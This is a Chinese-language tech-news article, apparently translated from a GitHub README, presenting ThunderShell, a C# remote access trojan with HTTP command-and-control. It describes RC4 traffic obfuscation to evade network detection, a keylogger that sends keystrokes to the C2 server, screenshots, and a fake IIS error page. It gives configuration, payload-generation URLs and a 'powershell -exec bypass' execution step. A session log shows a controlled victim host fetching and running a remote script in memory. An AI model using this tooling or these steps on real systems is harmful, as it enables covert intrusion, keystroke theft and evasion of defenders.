![PythonPowerShell实现的HTTP通信的远程控制软件](https://image.3001.net/images/20190216/1550284129_5c6775611f6c3.png!small)

**ThunderShell是一个通过HTTP请求进行通信的C#
RAT。所有网络流量都使用第二层RC4进行加密，以躲避SSL拦截及其目标系统上的网络检测。RC4是一种弱密码，用于帮助混淆流量。应使用HTTPS选项来提供完整性和强加密。**

## 特性

 **集成的非托管 PowerShell**

客户端使用C#来执行PowerShell代码，允许用户直接在shell上执行任意的PowerShell命令，而无需调用powershell.exe程序。

 **网络流量格式**

（正在开发中）ThunderShell允许你通过设置任意标头，并更改发送到服务器的数据格式来配置客户端执行的网络请求。

默认profile配置文件：profile.json

    
    
    {
            "headers": {
                                    "X-Powered-By": "ASP.NET",
                                    "X-AspNet-Version": "4.0.30319",
                                    "Set-Cookie": "ASP.NET_SessionId={{random}}[32];"
                    },
    
            "autocommands": ["ipconfig", "route -nr", "netstat -ano", "ps"],
            "auto-interact": "on"
    }

使用{{random}} [size]语法可在运行时设置任意的值。

 **反检测的优势**

“核心”RAT不需要在内存中注入/加载second-stage shellcode。

 **集成的Key-Logger**

RAT包含了一个集成的键盘记录器，可将所有输入存储在内存中，并将数据直接发送到我们的C2服务器。

 **截屏功能**

截屏功能支持多屏布局，并且不会在受害者计算机上创建任何的文件。

 **日志功能**

该工具提供典型的Web流量和错误日志。每个活动会话的聊天和命令都将被保存在磁盘上以供之后的参考使用。日志文件夹结构包含按日期排序的每个shell输出，key-logger feeds和屏幕截图。

 **多用户界面**

ThunderShell支持CLI和Web界面的使用，并在Web界面和CLI上同时支持多个用户。

 **多线程**

ThunderShell客户端支持多线程，这意味着你可以在目标上并行执行多个命令。

 **自定义返回页面**

你可以通过http-default-404变量指定HTML模板，自定义每个GET请求返回的“error”页面。该文件需要放在html文件夹中其依赖项（例如图片）需要放在download文件夹下。默认情况下，ThunderShell模仿IIS服务器并返回默认的IIS服务器页面。

 **传递任意文件**

任何放置在download文件夹下的文件都可以通过web
server进行下载。例如，/root/ThunderShell/download/evil.exe可以通过：<http://1.1.1.1:13337/evil.exe>进行下载。

## 安装

使用以下命令获取并安装ThunderShell：

    
    
    git clone https://github.com/Mr-Un1k0d3r/ThunderShell; cd ThunderShell; python3 ThunderShell.py default.json

ThunderShell将在第一次启动时，自动下载并安装所需的软件包。以下是将会安装的软件包列表：

    
    
    apt install redis-server 
    apt install mono-mcs 
    apt install python3-tabulate 
    apt install python3-redis 
    apt install python3-flask 
    apt install python3-dev 
    apt install python3-pip 
    apt install python3-gevent 
    python3 -m pip install flask-socketio

## 配置

首先，我们需要正确设置配置文件。以下是配置文件default.json的示例：

    
    
    {
        "aliases": {
            "myalias": ""
        },
        "callback-url": "http://192.168.0.3:8443/",
        "cli-sync-delay": 5,
        "gui-host": "127.0.0.1",
        "gui-port": 13337,
        "http-default-404": "default.html",
        "http-download-path": "cat.png",
        "http-host": "192.168.0.3",
        "http-port": 8443,
        "http-profile": "profile.json",
        "http-server": "Microsoft-IIS/7.5",
        "https-cert-path": "cert.pem",
        "https-enabled": "off",
        "max-output-timeout": 5,
        "redis-host": "localhost",
        "redis-port": 6379
    }

首次成功启动后，将会为我们自动生成server-password和encryption-key。

### HTTPS 配置

如果启用了https-enabled，则https-cert-path必须指向具有以下结构的PEM文件：

    
    
    -----BEGIN RSA PRIVATE KEY-----    ... (private key in base64 encoding) ...
    -----END RSA PRIVATE KEY-----    -----BEGIN CERTIFICATE-----    ... (certificate in base64 PEM encoding) ...
    -----END CERTIFICATE-----
## 启动 Server

服务器（包括Web界面）从CLI启动：

    
    
    $ python3 ThunderShell.py default.json MrUn1k0d3r

default.json是配置文件。MrUn1k0d3r是会话的用户名。默认情况下，将启动HTTP守护程序和Web
GUI。它也可以在没有httpd守护进程和web ui的情况下，使用开关-nohttpd和-nogui启动。

## ThunderShell 使用

 **生成 Payloads**

当前ThunderShell支持：

> C#（cs）
>
> powershell（ps）
>
> C# exe（exe）
>
> msbuild（msbuild）

注意，默认选项为powershell ps。

ThunderShell通过Web界面生成payload。端点由http-download-path变量定义。根据配置文件生成payload只需打开：

    
    
    http://192.168.0.3:8443/cat.png

端点支持多个选项，可以使用以下URL获取：

    
    
    http://192.168.0.3:8443/cat.png/<type>/<delay>/

<type>现在支持msbuild，cs，ps和exe。<delay>是每次回调之间的延迟时间（以毫秒为单位）默认值为10000（10秒）。

端点还负责根据配置中定义的callback-url设置回调URL。你可以拥有一个不同URL的代理在服务器前。

 **获取 shell**

有多种方法可以在目标上执行RAT。一个简单的例子是使用powershell：

    
    
    http://192.168.0.3:8443/cat.png/ps/

保存文件后。通过以下命令执行：

    
    
    powershell -exec bypass import-module .\file.ps1

可以直接下载可执行文件

    
    
    http://192.168.0.3:8443/cat.png/exe/

可以手动下载和修改原始C#数据

    
    
    http://192.168.0.3:8443/cat.png/cs/

 **客户端使用**

以下示例在没有调用powershell.exe的情况下，直接执行Windows和Powershell命令。fetch命令用于混淆powershell脚本。服务器将从指定的链接下载数据，然后使用RC4密钥对其进行加密并将其发送到客户端。然后，客户端将执行解密并执行代码以躲避网络检测。

    
    
    python3 ThunderShell.py default.json MrUn1k0d3r
    
    
                 .#"    =[ Thunder Shell 2.0.1 | RingZer0 Team ]=
               .##"
            .###"       __       __    _________    __            __
           ###P        ###|     ###|  ##########|  ###|          ###|
         d########"    ###|     ###|  ###|         ###|          ###|
         ****####"     ###|_____###|  ###|__       ###|          ###|
           .###"       ############|  ######|      ###|          ###|
          .##"         ###|     ###|  ###|         ###|          ###|
         .#"           ###|     ###|  ###|______   ###|_______   ###|_______
        ."             ###|     ###|  ##########|  ###########|  ###########|
    
    
    
    [-] install.lock not found
    [*] Generating new keys
    [+] Current Active session UUID is c8ab130e-9ec1-40d5-a5de-cb7c0ec9698a
    
    [+] Starting web server on 192.168.17.129 port 8080
    
    (Main)>>> help
    
    Help Menu
    
    =========
    
    Commands    Args                                  Descriptions
    ----------  ------------------------------------  --------------------------------------------------------------------------------------------    list        full                                  List all active shells
    interact    id                                    Interact with a session
    show        (password,key,error,http,event) rows  Show server password, encryption key, errors, http or events log (default number of rows 10)
    kill        id                                    kill shell (clear db only)
    os          command                               Execute command on the system (local)
    purge       force                                 WARNING! Delete all the Redis DB
    exit                                              Exit the application
    help
    
    (Main)>>>
    [+] Registering new shell DESKTOP-2JKIANV DESKTOP-2JKIANV\admin
    [+] New shell ID 12 GUID is nDCCYACFWYrU6LwM
    
    (Main)>>> interact 12
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> help
    
    Help Menu
    =========
    Commands    Args            Descriptions
    ----------  --------------  ------------------------------------------------------------    background                  Return to the main console
    fetch                       In memory execution of a script and execute a command
    exec        path/url, cmd   In memory execution of code (shellcode)
    read        path/url        Read a file on the remote host
    upload      remote path     Upload a file on the remote system
    ps          path/url, path  List processes
    inject      pid, command    Inject command into a target process (max length 4096)
    alias       key, value      Create an alias to avoid typing the same thing over and over
    delay       milliseconds    Update the callback delay
    help                        show this help menu
    
    List of built in aliases
    ------------------------    wmiexec                     Remote-WmiExecute utility
    searchevent                 Search-EventForUser utility
    
    List user defined aliases
    --------------------------    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> whoami
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
    [+] [(CLI)MrUn1k0d3r] Sending command: whoami
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
    [*] Command output:
    desktop-2jkianv\admin
    
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> cmd.exe /c ver
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
    [+] [(CLI)MrUn1k0d3r] Sending command: cmd.exe /c ver
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
    [*] Command output:
    Microsoft Windows [Version 10.0.16299.431]
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> $psversiontable
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
    [+] [(CLI)MrUn1k0d3r] Sending command: $psversiontable
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
    [*] Command output:
    Name                           Value
    ----                           -----    PSVersion                      5.1.16299.431
    PSEdition                      Desktop
    PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
    BuildVersion                   10.0.16299.431
    CLRVersion                     4.0.30319.42000
    WSManStackVersion              3.0
    PSRemotingProtocolVersion      2.3
    SerializationVersion           1.1.0.1
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> fetch https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-IEBookmarks.ps1 Get-IEBookmarks
    
    [+] Fetching https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-IEBookmarks.ps1
    [+] Executing Get-IEBookmarks
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
    [+] [(CLI)MrUn1k0d3r] Sending command: function Get-IEBookmarks {
            # Mr.Un1k0d3r - RingZer0 Team 2016
            # Get IE bookmarks URL
    
            BEGIN {
                    $path = [Environment]::GetFolderPath('Favorites')
                    Write-Output "[+] Bookmark are located in $($path)"
            }
    
            PROCESS {
                    Get-ChildItem -Recurse $path -Include "*.url" | ForEach {
                                    $data = Get-Content $_.fullname | Select-String -Pattern URL
                                    Write-Output $data
                            }
            }
    
            END {
                    Write-Output "[+] Process completed..."
            }
    }
    ;Get-IEBookmarks
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
    [*] Command output:
    [+] Bookmark are located in C:\Users\admin\Favorites
    
    URL=http://go.microsoft.com/fwlink/p/?LinkId=255142
    [+] Process completed...
    
    (DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>

 ***参考来源：[GitHub](https://github.com/Mr-Un1k0d3r/ThunderShell)，FB小编secist编译，转载请注明来自FreeBuf.COM**  

